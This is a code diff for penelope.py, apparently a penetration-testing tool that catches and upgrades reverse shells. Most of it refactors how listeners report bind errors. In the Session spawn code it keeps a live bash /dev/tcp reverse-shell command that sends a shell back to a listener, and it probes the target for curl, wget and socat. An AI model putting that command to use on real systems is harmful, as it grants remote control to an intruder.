@@ -1526,12 +1526,13 @@ def handle_bind_errors(func):
 	@wraps(func)
 	def wrapper(*args, **kwargs):
 		try:
-			return func(*args, **kwargs)
+			func(*args, **kwargs)
+			return True
 
 		except PermissionError:
-			port = args[1]
-			# TODO Improve
-			workarounds = dedent(
+			port = args[2]
+			logger.error(f"Cannot bind to port {port}: Insufficient privileges")
+			print(dedent(
 			f"""
 			{paint('Workarounds:')}
 
@@ -1551,25 +1552,26 @@ def handle_bind_errors(func):
 
 			3) {paint('SUDO').UNDERLINE} (The {__program__.title()}'s directory will change to /root/.penelope)
 			    sudo ./penelope.py {port}
-			""")
-			return (f"Cannot bind to port {port}: Insufficient privileges", workarounds)
+			"""))
 
 		except socket.gaierror:
-			return "Cannot resolve hostname"
+			logger.error("Cannot resolve hostname")
 
 		except OSError as e:
 			if e.errno == EADDRINUSE:
-				return "The port is currently in use"
+				logger.error("The port is currently in use")
 			elif e.errno == EADDRNOTAVAIL:
-				return "Cannot listen on the requested address"
+				logger.error("Cannot listen on the requested address")
 			else:
-				return f"OS error: {str(e)}"
+				logger.error(f"OS error: {str(e)}")
 
 		except OverflowError:
-			return "Invalid port number. Valid numbers: 1-65535"
+			logger.error("Invalid port number. Valid numbers: 1-65535")
 
 		except ValueError:
-			return "Port number must be numeric"
+			logger.error("Port number must be numeric")
+
+		return False
 	return wrapper
 
 def Connect(host, port):
@@ -1608,22 +1610,14 @@ class Listener:
 	def __init__(self, host=None, port=None):
 		self.host = host or options.default_interface
 		self.host = Interfaces().translate(self.host)
-		port = port or options.default_listener_port
+		self.port = port or options.default_listener_port
 		self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 		self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
 		self.socket.setblocking(False)
 		self.caller = caller()
 
-		result = self.bind(port)
-		if not isinstance(result, (str, tuple)):
+		if self.bind(self.host, self.port):
 			self.start()
-
-		elif not self.caller == 'spawn':
-			if isinstance(result, tuple):
-				logger.error(result[0])
-				print(result[1])
-				return
-			logger.error(result)
 
 	def __str__(self):
 		return f"Listener({self.host}:{self.port})"
@@ -1632,9 +1626,9 @@ class Listener:
 		return hasattr(self, 'id')
 
 	@handle_bind_errors
-	def bind(self, port):
+	def bind(self, host, port):
 		self.port = int(port)
-		self.socket.bind((self.host, self.port))
+		self.socket.bind((host, self.port))
 
 	def fileno(self):
 		return self.socket.fileno()
@@ -2059,7 +2053,7 @@ class Session:
 					binaries = [
 						"sh", "bash", "python", "python3",
 						"script", "socat", "tty", "echo", "base64", "wget",
-						"curl", "tar", "rm", "stty", "nohup", "find"
+						"curl", "tar", "rm", "stty", "setsid", "find"
 					]
 					response = self.exec(f'for i in {" ".join(binaries)}; do which $i 2>/dev/null || echo;done')
 					if response:
@@ -3360,13 +3354,15 @@ class Session:
 
 		if self.OS == "Unix":
 			if any([self.listener, port, host]):
-				if port is None: port = self._port
-				if host is None: host = self._host
 
-				new_listener = Listener(host, port)
+				port = port or self._port
+				host = host or self._host
+
+				if not next((listener for listener in core.listeners.values() if listener.port == port), None):
+					new_listener = Listener(host, port)
 
 				if self.bin['bash']:
-					# temp fix, appending 2>&1 because of popen in agent
+					# temp fix, appending 2>&1 because of popen in agent # obsolete
 					cmd = f'{self.bin["bash"]} -c "setsid {self.bin["bash"]} >& /dev/tcp/{host}/{port} 0>&1 &" 2>&1'
 
 				elif self.bin['sh']:
@@ -3461,6 +3457,7 @@ class Session:
 					else:
 						continue
 					break
+				#client.shutdown(socket.SHUT_RDWR)
 				client.close()
 				"""
 				session.exec(
@@ -3480,22 +3477,15 @@ class Session:
 			request_queue_size = 100
 
 			@handle_bind_errors
-			def server_bind(self, lport):
+			def server_bind(self, lhost, lport):
 				self.server_address = (lhost, int(lport))
 				super().server_bind()
 
 		def server_thread():
 			with ThreadedTCPServer(None, ThreadedTCPRequestHandler, bind_and_activate=False) as server:
-				result = server.server_bind(lport)
-				if isinstance(result, (str, tuple)):
-					if isinstance(result, tuple):
-						logger.error(result[0])
-						print(result[1])
-					else:
-						logger.error(result)
+				if not server.server_bind(lhost, lport):
 					return False
-				else:
-					server.server_activate()
+				server.server_activate()
 				task.append(server)
 				logger.info(f"Setup Port Forwarding: {lhost}:{lport} {'->' if _type=='L' else '<-'} {rhost}:{rport}")
 				session.tasks['portfwd'].append(task)
@@ -3777,7 +3767,7 @@ class Stream:
 			self.writebuf = queue.Queue()
 		self.writebuf.put(data)
 		if not self.feed_thread:
-			self.feed_thread = threading.Thread(daemon=True, target=self.feed, name="feed stream -> " + repr(self.id))
+			self.feed_thread = threading.Thread(target=self.feed, name="feed stream -> " + repr(self.id))
 			self.feed_thread.start()
 
 	def feed(self):
@@ -4107,7 +4097,6 @@ class FileServer:
 	def start(self):
 		threading.Thread(target=self._start).start()
 
-	@handle_bind_errors
 	def _start(self):
 		filemap, host, port, password, quiet = self.filemap, self.host, self.port, self.password, self.quiet
 
@@ -4119,7 +4108,7 @@ class FileServer:
 				super().__init__(*args, **kwargs)
 
 			@handle_bind_errors
-			def server_bind(self):
+			def server_bind(self, host, port):
 				self.server_address = (host, int(port))
 				super().server_bind()
 
@@ -4191,9 +4180,7 @@ class FileServer:
 				logger.info(f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}")
 
 		with CustomTCPServer((self.host, self.port), CustomHandler, bind_and_activate=False) as self.httpd:
-			result = self.httpd.server_bind()
-			if isinstance(result, str):
-				logger.error(result)
+			if not self.httpd.server_bind(self.host, self.port):
 				return False
 			self.httpd.server_activate()
 			self.id = core.new_fileserverID
